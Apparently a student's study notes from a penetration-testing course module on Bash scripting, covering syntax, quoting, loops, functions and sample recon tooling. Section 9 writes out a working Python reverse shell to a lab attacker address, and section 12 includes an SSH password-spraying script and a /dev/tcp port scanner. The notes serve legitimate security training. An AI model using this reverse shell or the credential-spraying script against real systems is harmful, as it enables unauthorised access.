# Bash Scripting
**HTB Academy Module** | **CPTS Prerequisites**
**Completed:** March 2026 | **Author:** Jay Patel

## Why This Module Matters For CPTS and Beyond

Bash scripting transforms you from someone who runs tools to someone who
builds them. During a penetration test you will constantly need to automate
repetitive tasks — scanning ranges, brute forcing services, parsing tool
output, exfiltrating data, creating payloads. The alternative is running
the same command 254 times manually.

For CPTS specifically, scripting shows up when you need to enumerate at
scale or when exercises require custom automation. For OSCP, writing a
quick bash script to enumerate a system or automate an exploit chain is a
genuine differentiator. Beyond certifications, detection engineers write
bash scripts constantly for log parsing, IOC extraction, and alert triage.

---

## 1. Script Structure and Execution

```bash
#!/bin/bash
# Shebang — tells the OS to use bash to interpret this file
# Always the first line of every bash script

# Make executable and run
chmod +x script.sh
./script.sh

# Run without execute permission
bash script.sh

# Run in debug mode — prints each command before executing
bash -x script.sh
```

---

## 2. Variables

```bash
# Assigning — no spaces around = sign
target="10.10.10.1"
port=80
name="Jay"

# Using — prefix with $
echo "Scanning $target on port $port"

# Best practice — always quote variables
echo "Target: $target"           # Correct
echo "Target: " $target          # Risky — word splitting on spaces

# Command substitution — capture command output
current_user=$(whoami)
ip_address=$(hostname -I | awk '{print $1}')
date_stamp=$(date +%Y-%m-%d)
open_ports=$(nmap -p- --open 10.10.10.1 | grep open | awk '{print $1}')

echo "User: $current_user"
echo "Ports: $open_ports"

# Special variables
$0      # Script name
$1      # First argument
$2      # Second argument
$@      # All arguments as separate words
$*      # All arguments as single string
$#      # Number of arguments
$?      # Exit code of last command (0 = success)
$$      # PID of current script
$!      # PID of last background command

# Arithmetic
count=$((count + 1))
result=$((10 * 3))
echo $((2 ** 8))        # 256
```

---

## 3. Quoting — Critical For Security and Correctness

This is where most beginners write insecure or broken scripts.

```bash
# Double quotes — allow variable expansion, prevent word splitting
name="Jay Patel"
echo "$name"             # Correct: Jay Patel
echo $name               # Risky: word splits on space

# Single quotes — literal, no expansion
echo '$name'             # Prints literally: $name
echo 'No $expansion'     # Prints: No $expansion

# Always quote variables in conditions
if [ "$username" = "admin" ]; then    # Correct
if [ $username = "admin" ]; then      # Breaks if username is empty or has spaces

# Quote file paths
find "$directory" -name "*.txt"       # Handles paths with spaces
find $directory -name "*.txt"         # Breaks on "My Documents"

# The IFS risk — Internal Field Separator
# Unquoted $@ splits on spaces, tabs, newlines
for file in $files; do    # Risky — breaks on filenames with spaces
for file in "$files"; do  # Treats entire string as one item
for file in "${files[@]}"; do  # Correct for arrays
```

---

## 4. Arguments and Input Validation

```bash
#!/bin/bash

# Validate arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_ip> <port>"
    echo "Example: $0 10.10.10.1 80"
    exit 1
fi

target=$1
port=$2

# Validate IP format
if [[ ! "$target" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo "Error: Invalid IP address format"
    exit 1
fi

# Validate port is a number in range
if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
    echo "Error: Port must be 1-65535"
    exit 1
fi

echo "Target: $target | Port: $port"

# Read user input interactively
echo -n "Enter username: "
read username

# Read silently (no echo — for passwords)
echo -n "Enter password: "
read -s password
echo ""   # New line after silent read
echo "Credentials captured"
```

---

## 5. Conditionals

```bash
# [ ] = traditional test (POSIX compatible)
# [[ ]] = bash extended test (preferred — more features, safer)

# Numeric comparison
if [ "$count" -eq 0 ]; then echo "Zero"; fi
if [ "$port" -gt 1024 ]; then echo "High port"; fi
# -eq -ne -lt -gt -le -ge

# String comparison
if [ "$os" = "linux" ]; then echo "Linux"; fi
if [ "$os" != "windows" ]; then echo "Not Windows"; fi
if [ -z "$var" ]; then echo "Empty string"; fi
if [ -n "$var" ]; then echo "Non-empty string"; fi

# File tests
if [ -f "/etc/passwd" ]; then echo "File exists"; fi
if [ -d "/tmp" ]; then echo "Is directory"; fi
if [ -r "/etc/shadow" ]; then echo "Readable"; fi
if [ -w "/tmp" ]; then echo "Writable"; fi
if [ -x "/usr/bin/python3" ]; then echo "Executable"; fi
if [ -s "file.txt" ]; then echo "Not empty"; fi

# [[ ]] extended features
if [[ "$string" == *"pattern"* ]]; then echo "Contains pattern"; fi
if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "Valid IP"; fi

# Combining conditions
if [ "$port" -gt 1024 ] && [ "$port" -lt 65535 ]; then
    echo "Unprivileged port"
fi

if [[ "$os" == "linux" || "$os" == "unix" ]]; then
    echo "Unix-like"
fi

# if/elif/else
if [ "$port" -eq 80 ]; then
    echo "HTTP"
elif [ "$port" -eq 443 ]; then
    echo "HTTPS"
elif [ "$port" -eq 22 ]; then
    echo "SSH"
else
    echo "Unknown service on port $port"
fi

# Case statement — cleaner for multiple conditions
case "$port" in
    22)   echo "SSH";;
    80)   echo "HTTP";;
    443)  echo "HTTPS";;
    3306) echo "MySQL";;
    *)    echo "Unknown port: $port";;
esac
```

---

## 6. Loops

```bash
# For loop — list
for host in 10.10.10.1 10.10.10.2 10.10.10.3; do
    ping -c 1 -W 1 "$host" &>/dev/null && echo "[+] $host is up"
done

# For loop — range
for i in $(seq 1 254); do
    host="10.10.10.$i"
    ping -c 1 -W 1 "$host" &>/dev/null && echo "[+] $host" &
done
wait    # Wait for all background pings to finish

# For loop — file contents
for user in $(cat users.txt); do
    echo "Testing: $user"
done

# While loop
counter=1
while [ "$counter" -le 10 ]; do
    echo "Count: $counter"
    counter=$((counter + 1))
done

# While loop — read file line by line (safest method)
while IFS= read -r line; do
    echo "Processing: $line"
done < wordlist.txt

# Break and continue
for port in $(seq 1 1024); do
    if [ "$port" -eq 80 ]; then
        echo "Found HTTP"
        break           # Stop loop
    fi
    if [ "$port" -eq 53 ]; then
        continue        # Skip to next iteration
    fi
done
```

---

## 7. Functions

```bash
#!/bin/bash

# Define function
check_port() {
    local target="$1"    # local = only exists inside function
    local port="$2"

    (echo >/dev/tcp/"$target"/"$port") 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $target:$port OPEN"
        return 0
    else
        return 1
    fi
}

print_banner() {
    local title="$1"
    echo "================================"
    echo "  $title"
    echo "================================"
}

log_result() {
    local message="$1"
    local logfile="$2"
    echo "$(date +%H:%M:%S) - $message" | tee -a "$logfile"
}

# Call functions
print_banner "Port Scanner v1.0"
check_port "10.10.10.1" 80
check_port "10.10.10.1" 443
log_result "Scan started" "/tmp/results.log"

# Function with return value via echo (not return)
get_os() {
    local target="$1"
    local ttl=$(ping -c 1 "$target" | grep ttl | awk -F'ttl=' '{print $2}' | awk '{print $1}')
    if [ "$ttl" -ge 128 ]; then
        echo "Windows"
    else
        echo "Linux"
    fi
}

os_type=$(get_os "10.10.10.1")
echo "OS detected: $os_type"
```

---

## 8. Arrays

```bash
# Indexed array
targets=("10.10.10.1" "10.10.10.2" "10.10.10.3")
ports=(22 80 443 3306 3389)

echo "${targets[0]}"        # First element
echo "${targets[@]}"        # All elements
echo "${#targets[@]}"       # Count: 3

# Iterate
for target in "${targets[@]}"; do
    echo "Scanning: $target"
done

# Add element
targets+=("10.10.10.4")

# Associative array (dictionary)
declare -A services
services[22]="SSH"
services[80]="HTTP"
services[443]="HTTPS"
services[3306]="MySQL"
services[3389]="RDP"

# Access
echo "Port 22: ${services[22]}"

# Iterate over keys and values
for port in "${!services[@]}"; do
    echo "Port $port: ${services[$port]}"
done
```

---

## 9. Here Documents and Here Strings

Used constantly in pentest scripts for writing multi-line content.

```bash
# Here document — write multi-line string to command or file
cat << EOF > /tmp/payload.py
import socket
import subprocess
s = socket.socket()
s.connect(("10.10.14.1", 4444))
subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
EOF

# Here document — multi-line input to command
mysql -u root -p << EOF
USE customers;
SELECT * FROM users;
EOF

# Here string — single line input
grep "pattern" <<< "This is the string to search"
base64 <<< "encode this string"

# Practical use — write config file from script
cat << EOF > /etc/hosts.allow
sshd: 10.10.14.0/24
ALL: LOCAL
EOF
```

---

## 10. Error Handling

```bash
#!/bin/bash
set -e           # Exit immediately on any error
set -u           # Treat unset variables as errors
set -o pipefail  # Catch errors inside pipes (not just last command)

# Check exit code
ping -c 1 10.10.10.1 &>/dev/null
if [ $? -ne 0 ]; then
    echo "Host unreachable"
    exit 1
fi

# Short syntax
ping -c 1 10.10.10.1 &>/dev/null && echo "Up" || echo "Down"

# Trap — run function on error or exit
cleanup() {
    echo "Cleaning up temp files"
    rm -f /tmp/scan_$$.txt
}
trap cleanup EXIT    # Run cleanup when script exits (any reason)

handle_error() {
    echo "[ERROR] Failed at line $1"
    exit 1
}
trap 'handle_error $LINENO' ERR    # Run on any error

# Redirect errors cleanly
find / -name "*.conf" 2>/dev/null          # Discard permission errors
nmap -sV 10.10.10.1 2>&1 | tee scan.txt   # Capture both stdout and stderr
```

---

## 11. Regular Expressions in Bash

```bash
# [[ ]] supports =~ for regex matching
ip="192.168.1.100"

# Test valid IP format
if [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo "Valid IP format"
fi

# Test email format
email="user@domain.com"
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
    echo "Valid email"
fi

# Test if string is all digits
if [[ "$port" =~ ^[0-9]+$ ]]; then
    echo "Port is numeric"
fi

# Extract matches with grep
# Get all IP addresses from nmap output
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' nmap_output.txt

# Get all open ports
grep -oP '^\d+' nmap_output.txt | sort -n

# Get all emails from a file
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt
```

---

## 12. Practical Pentest Scripts

### Host Discovery — Parallel Ping Sweep
```bash
#!/bin/bash
# Usage: ./discover.sh 10.10.10

if [ $# -ne 1 ]; then
    echo "Usage: $0 <network_prefix>"
    echo "Example: $0 10.10.10"
    exit 1
fi

network="$1"
output="/tmp/live_hosts_$$.txt"

echo "[*] Scanning $network.0/24"

for i in $(seq 1 254); do
    (
        host="$network.$i"
        ping -c 1 -W 1 "$host" &>/dev/null && echo "$host" >> "$output"
    ) &
done

wait    # Wait for all 254 background pings

if [ -f "$output" ]; then
    echo "[+] Live hosts:"
    sort -t. -k4 -n "$output"
    echo "[*] Total: $(wc -l < "$output") hosts"
    rm -f "$output"
else
    echo "[-] No hosts responded"
fi
```

### Port Scanner Using /dev/tcp
```bash
#!/bin/bash
# Usage: ./portscan.sh <target> [start_port] [end_port]

target="$1"
start="${2:-1}"
end="${3:-1024}"

echo "[*] Scanning $target ports $start-$end"

for port in $(seq "$start" "$end"); do
    (echo >/dev/tcp/"$target"/"$port") 2>/dev/null && \
    echo "[+] Port $port OPEN"
done

echo "[*] Scan complete"
```

### Nmap Output Parser
```bash
#!/bin/bash
# Parse nmap output and extract useful information
# Usage: ./parse_nmap.sh <nmap_output_file>

file="$1"

if [ ! -f "$file" ]; then
    echo "File not found: $file"
    exit 1
fi

echo "=== Open Ports ==="
grep "open" "$file" | grep -v "filtered"

echo ""
echo "=== Services Detected ==="
grep "open" "$file" | awk '{print $1, $3, $4, $5}' | column -t

echo ""
echo "=== HTTP/HTTPS Services ==="
grep -E "80|443|8080|8443" "$file" | grep "open"

echo ""
echo "=== Database Services ==="
grep -E "3306|1433|5432|1521|27017" "$file" | grep "open"

echo ""
echo "=== Remote Access Services ==="
grep -E "22|23|3389|5985|5986" "$file" | grep "open"
```

### Auth Log Parser
```bash
#!/bin/bash
# Parse auth.log for attack patterns
# Usage: ./parse_auth.sh [logfile]

logfile="${1:-/var/log/auth.log}"

if [ ! -f "$logfile" ]; then
    echo "Log file not found: $logfile"
    exit 1
fi

echo "=== Top Attacking IPs ==="
grep "Failed password" "$logfile" \
    | awk '{print $11}' \
    | sort | uniq -c | sort -rn \
    | head -20

echo ""
echo "=== Targeted Usernames ==="
grep "Failed password" "$logfile" \
    | awk '{print $9}' \
    | sort | uniq -c | sort -rn \
    | head -10

echo ""
echo "=== Successful Logins ==="
grep "Accepted" "$logfile" \
    | awk '{print $9, $11}' \
    | sort | uniq -c | sort -rn

echo ""
echo "=== Timeline of Attacks ==="
grep "Failed password" "$logfile" \
    | awk '{print $1, $2, $3}' \
    | uniq -c \
    | tail -20
```

### Credential Testing via SSH
```bash
#!/bin/bash
# Test SSH credentials from a username list
# Usage: ./ssh_bruteforce.sh <target> <userlist> <password>
# Requires: sshpass (apt install sshpass)

target="$1"
userlist="$2"
password="$3"

if [ $# -ne 3 ]; then
    echo "Usage: $0 <target> <userlist> <password>"
    exit 1
fi

echo "[*] Testing password '$password' against $(wc -l < "$userlist") users on $target"

while IFS= read -r user; do
    result=$(sshpass -p "$password" ssh \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 \
        -o BatchMode=no \
        "$user@$target" "echo success" 2>/dev/null)
    if [ "$result" = "success" ]; then
        echo "[+] VALID: $user:$password @ $target"
    fi
done < "$userlist"

echo "[*] Done"
```

---

## 13. Integrating With Pentest Tools

Bash scripts become powerful when they orchestrate real pentest tools.

```bash
#!/bin/bash
# Full recon pipeline — run multiple tools and parse combined output
# Usage: ./recon.sh <target_ip> <domain>

target="$1"
domain="$2"
output_dir="/tmp/recon_${target}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$output_dir"

echo "[*] Starting recon on $target ($domain)"

# Step 1 — Nmap scan
echo "[*] Running nmap..."
nmap -sC -sV -oA "$output_dir/nmap" "$target" 2>/dev/null
echo "[+] Nmap complete"

# Step 2 — Parse nmap for web ports
web_ports=$(grep "open" "$output_dir/nmap.gnmap" | grep -E "80|443|8080|8443" | \
            grep -oP '\d+/open' | cut -d/ -f1 | tr '\n' ',')

# Step 3 — Gobuster on each web port
if [ -n "$web_ports" ]; then
    echo "[*] Web ports found: $web_ports"
    for port in $(echo "$web_ports" | tr ',' '\n'); do
        echo "[*] Running gobuster on port $port..."
        gobuster dir \
            -u "http://$target:$port" \
            -w /usr/share/wordlists/dirb/common.txt \
            -o "$output_dir/gobuster_$port.txt" \
            -q 2>/dev/null
        echo "[+] Gobuster port $port complete"
    done
fi

# Step 4 — DNS enumeration if domain provided
if [ -n "$domain" ]; then
    echo "[*] Running DNS enumeration on $domain..."
    dig any "$domain" > "$output_dir/dns.txt" 2>/dev/null
    dig axfr "$domain" >> "$output_dir/dns.txt" 2>/dev/null
fi

# Step 5 — Summary
echo ""
echo "=== RECON SUMMARY ==="
echo "Target: $target"
echo "Output: $output_dir"
echo "Open ports:"
grep "open" "$output_dir/nmap.gnmap" | grep -oP '\d+/open/tcp' | cut -d/ -f1
echo "Web directories found:"
cat "$output_dir"/gobuster_*.txt 2>/dev/null | grep "Status: 200"
```

---

## 14. Debugging Scripts

```bash
#!/bin/bash
# Debug modes
set -x          # Print each command before executing (trace)
set -v          # Print each line as read

# Run with debug without modifying script
bash -x script.sh
bash -v script.sh

# Debug specific sections only
set -x
# commands to debug here
set +x          # Turn off

# Common debugging mistakes

# 1. Missing quotes — breaks on spaces
file="my file.txt"
if [ -f $file ]; then     # WRONG — splits into: [ -f my file.txt ]
if [ -f "$file" ]; then   # CORRECT

# 2. [ vs [[ — use [[ in bash scripts
if [ "$a" && "$b" ]; then   # WRONG in [ ]
if [[ "$a" && "$b" ]]; then # CORRECT in [[ ]]

# 3. = vs == vs -eq
if [ "$str" = "value" ]; then    # String comparison — use =
if [ "$num" -eq 42 ]; then       # Number comparison — use -eq
if [[ "$str" == "value" ]]; then # Also fine in [[ ]]

# 4. Forgetting to wait for background jobs
for i in $(seq 1 254); do
    ping -c 1 "$i" &    # Background
done
# Script exits immediately — background jobs may still be running
wait    # Add this

# 5. Variable not exported to subshell
MY_VAR="hello"
bash -c 'echo $MY_VAR'   # Empty — not exported
export MY_VAR
bash -c 'echo $MY_VAR'   # Now works
```

---

## 15. What I Learned / What Surprised Me

The quoting section changed how I write every script. I used to skip quotes
around variables without thinking about it — seeing how a single unquoted
`$filename` breaks when the filename contains a space, or how an empty
variable causes a condition to fail silently, made me understand why
experienced people insist on always quoting. It is not pedantry — it is
the difference between a script that works and one that fails in production.

The here document syntax was completely new to me. Being able to write an
entire multi-line Python reverse shell payload directly into a bash script
and redirect it straight to a file — without escaping every line — is
genuinely powerful. That is exactly how you would deploy a payload during
an engagement: write the script with the payload embedded, execute it on
the target.

The recon pipeline script was the most satisfying to write — orchestrating
nmap, then parsing its output to find web ports, then automatically feeding
those ports into gobuster, then summarising everything — that is what
automation looks like in practice. A pentester who writes that kind of
tooling is fundamentally more capable than one who runs each tool manually.

---

## Quick Reference Card

| Task | Command/Syntax |
|---|---|
| Run script | `chmod +x script.sh && ./script.sh` |
| Debug mode | `bash -x script.sh` |
| Exit on error | `set -e` at top of script |
| Get argument | `$1`, `$2`, argument count `$#` |
| Capture output | `var=$(command)` |
| Loop over range | `for i in $(seq 1 254); do ... done` |
| Read file line by line | `while IFS= read -r line; do ... done < file` |
| Background + wait | `command & ... wait` |
| Discard errors | `command 2>/dev/null` |
| Output to file and terminal | `command \| tee output.txt` |
| Here document | `cat << EOF > file ... EOF` |
| Test valid IP | `[[ "$ip" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]` |
| Case statement | `case "$var" in pattern) cmd;; esac` |
| Associative array | `declare -A arr; arr[key]=value` |
| Trap on exit | `trap cleanup EXIT` |
| Check file exists | `[ -f "$file" ]` |
| Check directory | `[ -d "$dir" ]` |
| String contains | `[[ "$str" == *"substr"* ]]` |
| Arithmetic | `result=$((a + b))` |
